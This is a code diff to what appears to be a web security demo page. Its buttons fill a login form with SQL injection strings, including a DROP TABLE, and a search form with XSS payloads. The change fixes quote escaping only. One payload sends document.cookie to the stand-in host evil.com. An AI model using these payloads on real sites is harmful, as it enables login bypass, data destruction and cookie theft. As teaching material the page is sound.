@@ -703,10 +703,10 @@
                         <label>Quick Attack Payloads</label>
                         <div class="attack-chips">
                             <span class="normal-chip attack-chip" onclick="fillSQLi('admin','admin123')">admin / admin123 (정상)</span>
-                            <span class="attack-chip" onclick="fillSQLi(\"' OR '1'='1' --\",\"anything\")">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span>
-                            <span class="attack-chip" onclick="fillSQLi(\"admin' --\",\"x\")">admin&#x27; --</span>
-                            <span class="attack-chip" onclick="fillSQLi(\"' UNION SELECT * FROM users --\",\"x\")">UNION SELECT</span>
-                            <span class="attack-chip" onclick="fillSQLi(\"'; DROP TABLE users; --\",\"x\")">DROP TABLE</span>
+                            <span class="attack-chip" onclick="fillSQLi('\x27 OR \x271\x27=\x271\x27 --','anything')">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span>
+                            <span class="attack-chip" onclick="fillSQLi('admin\x27 --','x')">admin&#x27; --</span>
+                            <span class="attack-chip" onclick="fillSQLi('\x27 UNION SELECT * FROM users --','x')">UNION SELECT</span>
+                            <span class="attack-chip" onclick="fillSQLi('\x27; DROP TABLE users; --','x')">DROP TABLE</span>
                         </div>
                     </div>
                     <div class="form-group">
@@ -742,9 +742,9 @@
                         <label>Quick Attack Payloads</label>
                         <div class="attack-chips">
                             <span class="normal-chip attack-chip" onclick="fillXSS('노트북')">노트북 (정상)</span>
-                            <span class="attack-chip" onclick="fillXSS('<script>alert(\"XSS\")</script>')">&lt;script&gt;alert()&lt;/script&gt;</span>
+                            <span class="attack-chip" onclick="fillXSS('<script>alert(\x22XSS\x22)</script>')">&lt;script&gt;alert()&lt;/script&gt;</span>
                             <span class="attack-chip" onclick="fillXSS('<img src=x onerror=alert(document.cookie)>')">&lt;img onerror=...&gt;</span>
-                            <span class="attack-chip" onclick="fillXSS('<svg onload=fetch(\"http://evil.com/steal?c=\"+document.cookie)>')">&lt;svg onload=fetch()&gt;</span>
+                            <span class="attack-chip" onclick="fillXSS('<svg onload=fetch(\x22http://evil.com/steal?c=\x22+document.cookie)>')">&lt;svg onload=fetch()&gt;</span>
                             <span class="attack-chip" onclick="fillXSS('<iframe src=javascript:alert(1)>')">&lt;iframe javascript:&gt;</span>
                         </div>
                     </div>
